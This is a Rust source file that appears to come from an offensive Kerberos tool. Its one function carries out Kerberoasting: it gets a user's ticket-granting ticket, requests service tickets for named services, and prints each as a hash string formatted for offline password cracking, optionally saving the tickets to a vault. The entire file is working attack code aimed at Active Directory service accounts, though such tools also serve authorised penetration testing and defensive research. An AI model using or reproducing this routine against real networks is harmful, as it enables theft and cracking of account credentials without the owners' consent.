use crate::core::CredFormat;
use crate::core::KrbUser;
use crate::core::Vault;
use crate::core::{get_user_tgt, request_tgs};
use crate::core::{tgs_to_crack_string, CrackFormat, S4u2options};
use crate::error::Result;
use crate::transporter::KerberosTransporter;
use kerberos_crypto::Key;
use log::info;

pub fn kerberoast(
    user: KrbUser,
    services: Vec<String>,
    in_vault: &dyn Vault,
    out_vault: Option<&dyn Vault>,
    user_key: Option<&Key>,
    transporter: &dyn KerberosTransporter,
    cred_format: CredFormat,
    crack_format: CrackFormat,
    etype: Option<i32>,
) -> Result<()> {
    let username = user.name.clone();
    let (mut krb_cred_plain, cred_format, tgt) = get_user_tgt(
        user.clone(),
        in_vault,
        user_key,
        transporter,
        cred_format,
        etype,
    )?;

    for service in services {
        match request_tgs(
            user.clone(),
            tgt.clone(),
            S4u2options::Normal(service.clone()),
            etype.map(|e| vec![e]),
            transporter,
        ) {
            Err(err) => match &err {
                _ => return Err(err),
            },
            Ok(tgs) => {
                let crack_str = tgs_to_crack_string(
                    &username,
                    &service,
                    &tgs.ticket,
                    crack_format,
                );
                println!("{}", crack_str);
                krb_cred_plain.push(tgs);
            }
        }
    }

    if let Some(out_vault) = out_vault {
        info!("Save {} TGSs in {}", username, out_vault.id());
        out_vault.save(krb_cred_plain.into(), cred_format)?;
    }
    return Ok(());
}
